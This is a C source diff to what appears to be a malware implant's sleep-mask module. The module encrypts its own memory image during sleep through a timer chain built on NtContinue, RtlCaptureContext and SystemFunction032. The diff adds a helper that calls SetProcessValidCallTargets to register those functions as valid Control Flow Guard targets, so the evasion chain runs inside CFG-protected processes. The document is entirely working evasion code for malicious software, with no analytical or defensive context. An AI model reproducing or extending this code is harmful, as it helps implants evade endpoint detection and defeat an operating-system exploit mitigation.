@@ -116,6 +116,19 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
     // --- SystemFunction032 typedef ---
     typedef NTSTATUS (WINAPI *SystemFunction032_t)(PUSTRING data, PUSTRING key);
 
+    // --- CFG call target info for SetProcessValidCallTargets ---
+    #ifndef CFG_CALL_TARGET_VALID
+    #define CFG_CALL_TARGET_VALID 0x00000001
+    typedef struct _CFG_CALL_TARGET_INFO {
+        ULONG_PTR Offset;
+        ULONG_PTR Flags;
+    } CFG_CALL_TARGET_INFO;
+    #endif
+
+    typedef BOOL (WINAPI *SetProcessValidCallTargets_t)(
+        HANDLE hProcess, PVOID VirtualAddress, SIZE_T RegionSize,
+        ULONG NumberOfOffsets, CFG_CALL_TARGET_INFO* OffsetInformation);
+
     // --- Resolved function pointers for self-masking ---
     static SystemFunction032_t   pSystemFunction032     = NULL;
     static LPVOID                pVirtualProtect        = NULL;
@@ -127,10 +140,32 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
     static BOOL                  selfMaskReady          = FALSE;
 
     /**
-    * Resolve function pointers needed for the self-masking timer chain.
-    * Called once during initialization.
+    * Mark a function pointer as a valid CFG indirect call target.
+    * Uses the module base + image size as the CFG region.
     *
-    * @return TRUE if all pointers were resolved successfully.
+    * @param pSetValid  Resolved SetProcessValidCallTargets pointer.
+    * @param hModule    Module containing the target function.
+    * @param pTarget    Function pointer to mark as valid.
+    * @return TRUE on success.
+    */
+    static BOOL AddCfgException(SetProcessValidCallTargets_t pSetValid, HMODULE hModule, LPVOID pTarget) {
+        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + dosHeader->e_lfanew);
+        DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
+
+        CFG_CALL_TARGET_INFO cfgInfo;
+        cfgInfo.Offset = (ULONG_PTR)pTarget - (ULONG_PTR)hModule;
+        cfgInfo.Flags  = CFG_CALL_TARGET_VALID;
+
+        return pSetValid((HANDLE)(LONG_PTR)-1, (PVOID)hModule, imageSize, 1, &cfgInfo);
+    }
+
+    /**
+    * Resolve function pointers needed for the self-masking timer chain.
+    * Also marks timer callback targets as valid CFG indirect call targets
+    * to prevent FAST_FAIL_GUARD_ICALL_CHECK_FAILURE on CFG-enabled processes.
+    *
+    * @return TRUE if all pointers were resolved and CFG exceptions registered.
     */
     BOOL InitSelfMask() {
         HMODULE hNtdll    = GetModuleHandleA("ntdll.dll");
@@ -155,6 +190,25 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
             !pRtlCaptureContext) {
             DLOG("SLEEPMASK: Failed to resolve function pointers for self-masking\n");
             return FALSE;
+        }
+
+        // Register timer callback targets as valid CFG indirect call targets.
+        // RtlCreateTimer dispatches callbacks through RtlpTpTimerCallback which
+        // validates against CFG. Without this, NtContinue/RtlCaptureContext/SetEvent
+        // trigger FAST_FAIL_GUARD_ICALL_CHECK_FAILURE on CFG-enabled processes.
+        HMODULE hKernelBase = GetModuleHandleA("kernelbase.dll");
+        if (hKernelBase) {
+            SetProcessValidCallTargets_t pSetValid =
+                (SetProcessValidCallTargets_t)GetProcAddress(hKernelBase, "SetProcessValidCallTargets");
+            if (pSetValid) {
+                if (!AddCfgException(pSetValid, hNtdll, pRtlCaptureContext) ||
+                    !AddCfgException(pSetValid, hKernel32, pSetEvent) ||
+                    !AddCfgException(pSetValid, hNtdll, pNtContinue)) {
+                    DLOG("SLEEPMASK: Failed to register CFG exceptions for self-masking\n");
+                    return FALSE;
+                }
+                DLOG("SLEEPMASK: CFG exceptions registered for timer callbacks\n");
+            }
         }
 
         DLOG("SLEEPMASK: Self-masking function pointers resolved\n");
